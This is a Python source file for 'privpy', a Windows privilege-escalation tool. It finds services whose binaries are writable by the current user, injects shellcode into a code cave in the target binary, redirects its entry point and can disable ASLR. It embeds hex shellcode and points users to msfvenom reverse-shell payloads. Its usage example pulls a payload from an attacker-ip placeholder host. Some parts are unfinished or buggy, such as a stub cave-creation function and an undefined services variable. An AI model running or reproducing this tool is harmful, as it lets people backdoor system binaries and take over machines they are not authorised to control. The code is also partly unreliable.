import subprocess
import argparse
import pefile
import os

# NOTE: make the option to check a cave for padding null bytes to write trampoline back to original EntryPoint

TEST_PAYLOAD_MESSAGEBOX_32BIT = 'fce88f0000006089e531d2648b52308b520c8b52148b722831ff0fb74a2631c0ac3c617c022c20c1cf0d01c74975ef528b52108b423c5701d08b407885c0744c01d0508b48188b582001d385c9743c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5de80b0000007573657233322e646c6c00684c772607ffd56a00e80700000050726976507900e830000000504520686173206265656e20696e6a65637465642062792050776e656e67696e6527732050726976507920746f6f6c006a006845835607ffd56a0068f0b5a256ffd5'
TEST_PAYLOAD_MESSAGEBOX_64BIT = 'fc4881e4f0ffffffe8cc00000041514150524831d265488b52605156488b5218488b52204d31c9480fb74a4a488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d08b4818448b4020504901d0e35648ffc94d31c9418b34884801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b048841584801d041585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5de80b0000007573657233322e646c6c005941ba4c772607ffd549c7c100000000e830000000504520686173206265656e20696e6a65637465642062792050776e656e67696e6527732050726976507920746f6f6c005ae8070000005072697650790041584831c941ba45835607ffd54831c941baf0b5a256ffd5'

class c_colors:
  RED = "\033[31m"
  GREEN = "\033[32m"
  YELLOW = "\033[33m"
  BLUE = "\033[34m"
  MAGENTA = "\033[35m"
  CYAN = "\033[36m"
  WHITE = "\033[37m"
  RESET = "\033[0m"
  BOLD = "\033[1m"
  UNDERLINE = "\033[4m"

os.system('')

# Create the ability to make code caves
def create_cave():
  print('Attemping to create a code cave for payload..')

def find_cave(pe, min_cave_size):
  print('Attemping to find a code cave for payload.')
  # Traverse the sections in the pe
  for section in pe.sections:
    # Make sure the section is usable
    if section.SizeOfRawData == 0:
      continue
    if not (section.Characteristics & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']):
      continue
    
    # handle it the right way in the future
    # if not (section.Characteristics & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE']):
    
        
    data = section.get_data()
    count = 0
    # Count the bytes null bytes in the section until we have a good sized cave for the payload
    for position, byte in enumerate(data):
      if byte == 0x00:
        count += 1
      else:
        if count >= min_cave_size:
          cave_rva = section.VirtualAddress + position - count
          # Convert RVA to file offset
          cave_offset = pe.get_offset_from_rva(cave_rva)
          print(f"Found code cave at RVA: 0x{cave_rva:X}, File Offset: 0x{cave_offset:X}")
          return cave_rva, cave_offset
        count = 0
    # Check if cave is at the end of section
    if count >= min_cave_size:
        cave_rva = section.VirtualAddress + len(data) - count
        cave_offset = pe.get_offset_from_rva(cave_rva)
        print(f"Found code cave at RVA: 0x{cave_rva:X}, File Offset: 0x{cave_offset:X}")
        return cave_rva, cave_offset
  print(f'Could NOT find cave of minimum size: {min_cave_size}')
  return 0, 0

def align(val_to_align, alignment):
  return ((val_to_align + alignment - 1) / alignment) * alignment
  
def write_shellcode(pathname, shell_code_hex):
  # Get bytes from the shell code hex
  shellcode = bytes.fromhex(shell_code_hex)
  
  # Load the PE file
  pe = pefile.PE(pathname)

  # Find cave (returns both RVA and file offset)
  cave_rva, cave_offset = find_cave(pe, len(shellcode))

  if cave_rva == 0:
    print("No suitable code cave found!")
    create_new_section = input('Would you like to create one? (y, n): ')
    if create_new_section == 'n':
      pe.close()
      exit()
    create_cave()    
  
  else:
    disable_alsr = input('Would you like to disable ALSR? This is not stealthy (y, n): ')
    if disable_alsr == 'y':
      # Disable ASLR not steathy
      pe.OPTIONAL_HEADER.DllCharacteristics &= ~pefile.DLL_CHARACTERISTICS['IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE']
    
    # Write the shellcode
    pe.set_bytes_at_offset(cave_offset, shellcode)

    # Update entry point (consider image base if needed)
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = cave_rva

    # Save the modified executable
    pe.write(pathname)
    print(f'Wrote to binary: {pathname}')
  pe.close()

def capture_service_details():
  services = {}
  all_services_stdout = subprocess.run(['sc', 'query'], capture_output=True, text=True, shell=True).stdout
  for line in all_services_stdout.splitlines():
    if 'SERVICE_NAME: ' in line:
      service_name = line.split(' ')[1]
      service_info_stdout = subprocess.run(['sc', 'qc', service_name], capture_output=True, text=True, shell=True).stdout
      
      service_start_name = ''
      binary_path_name = ''
      for sub_line in service_info_stdout.splitlines():
        if 'SERVICE_START_NAME' in sub_line:
          service_start_name = sub_line.split(': ')[1]
        if 'BINARY_PATH_NAME' in sub_line:
          binary_path_name = sub_line.split(': ')[1]
          
    
      services[service_name] = [service_start_name, binary_path_name]
      
  return services

# check if the logged in user or user's group, or everyone has either modify, write, or full access to bin path
def check_vulnerable(binary_path: str):
  vuln_msg = ''
  dacl_stdout = subprocess.run(['icacls', binary_path], text=True, capture_output=True, shell=True).stdout
  for line in dacl_stdout.splitlines():
    if 'Everyone:' in line:
      if '(F)' in line or '(M)' in line or '(W)' in line:
        vuln_msg = "This binary is vulnerable\nEvery account has access to it!"
    elif f'{os.getlogin()}:' in line:
      if '(F)' in line or '(M)' in line or '(W)' in line:
        vuln_msg = "This binary is vulnerable\nYour current account has access to it!"
      
  return vuln_msg

if __name__ == '__main__':
  parser = argparse.ArgumentParser(
    description='A python privledge escalation script that takes advantages of service binary vulnerabilities.',
    epilog='''
    Examples:
      privpy.py --list\n
      privpy.py -s <service-name> -p http://<attacker-ip>:<attacker-port>/payload.exe\n
    '''
  )

  parser.add_argument('-l', '--list', action='store_true', help='List all services and highlight vulnerable service binaries in red.')
  parser.add_argument('--write-shellcode', nargs=1, help='Will write shell code to a file of your choice instead of a services binary. Use -p, or --payload to specify shell code payload.')
  parser.add_argument('-p', '--payload', help='Shell code that will be written to the vulnerable services binary. You can use msfvenom to generate shell code to get a reverse shell.')
  parser.add_argument('-s', '--service-name', help='The Service Name of the service binary you wish to target')
  parser.add_argument('--find-cave', nargs=2, help='Find the Relative Virtual Address of a code cave in a binary. Make sure to specify the binary and size in bytes IN THAT ORDER.')
  parser.add_argument('--auto-payload', nargs=1, help="Use a hardcoded payload. Generally just use this for testing.\nOptions are:\n0 - pe32 MessageBox\n 1 - 1 pe32+ MessageBox")
  
  args = parser.parse_args()
  
  print(r'''
      (   (   (          (       )  
    )\ ))\ ))\ )       )\ ) ( /(  
    (()/(()/(()/((   ( (()/( )\()) 
    /(_))(_))(_))\  )\ /(_)|(_)\  
    (_))(_))(_))((_)((_|_))__ ((_) 
    | _ \ _ \_ _\ \ / /| _ \ \ / / 
    |  _/   /| | \ V / |  _/\ V /  
    |_| |_|_\___| \_/  |_|   |_|   
    
  ''')
  
  print(f'{c_colors.RED}  Windows Privledge Escalation{c_colors.RESET}')

  if args.list:
    login = os.getlogin()
    services = capture_service_details()
    for key, value in services.items():
      
      print(key)
      print('========================================')
      if login == value[0]:
        print(f'running as: {value[0]}')
      else:
        print(f'{c_colors.YELLOW}running as: {value[0]}{c_colors.RESET}')
        
      print(f'binary path: {value[1]}')
      
      vuln = check_vulnerable(value[1])
      if vuln:
        print(f'{c_colors.RED}{vuln}{c_colors.RESET}')
      else:
        print(f'\n{c_colors.BLUE}binary does not seem vulnerable{c_colors.RESET}')
      
      print('\n')
      
  elif args.write_shellcode:
    if args.auto_payload:
      if args.auto_payload[0] == '0':
        write_shellcode(args.write_shellcode[0], TEST_PAYLOAD_MESSAGEBOX_32BIT)
      elif args.auto_payload[0] == '1':
        write_shellcode(args.write_shellcode[0], TEST_PAYLOAD_MESSAGEBOX_64BIT)
    else:  
      write_shellcode(args.write_shellcode[0], args.payload)
      
  elif args.find_cave:
    pe = pefile.PE(args.find_cave[0])
    find_cave(pe, args.find_cave[1])
    exit()
  
  else:
    running_as = ''
    shell_code = ''
    target_binary = ''
    service_name = ''
    
    if not args.service_name:
      print('Must provide a service name. Run "privpy.py -h" for more infomation')
      exit()
    else:
      service_name = args.service_name
      
    if not args.payload:
      print('Must give a file containing a shell code payload.')
      exit()
    else:
      shell_code = args.payload
      
    running_as    = services.get(service_name)[0]
    target_binary = services.get(service_name)[1]
      
    print(f'''
        Attempting to write: {shell_code}
        
        To: {target_binary}      
    ''')
    
    if args.auto_payload:
      if args.auto_payload[0] == '0':
        write_shellcode(target_binary, TEST_PAYLOAD_MESSAGEBOX_32BIT)
      elif args.auto_payload[0] == '1':
        write_shellcode(target_binary, TEST_PAYLOAD_MESSAGEBOX_64BIT)
    else:  
      write_shellcode(target_binary, shell_code)
      
   
